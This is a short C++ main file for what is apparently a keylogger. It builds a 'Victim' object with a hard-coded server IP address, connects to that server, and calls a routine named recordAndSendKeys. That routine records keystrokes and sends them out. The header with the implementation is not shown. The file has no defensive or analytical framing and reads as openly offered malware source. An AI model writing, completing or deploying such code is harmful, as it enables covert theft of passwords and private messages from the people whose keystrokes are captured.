#include "Victim.h"

int main() {
	Victim* victim = new Victim("3.129.187.220");

	if (victim->connectToServer() != 0) {
		return -1;
	}
	victim->recordAndSendKeys();

	return 0;
}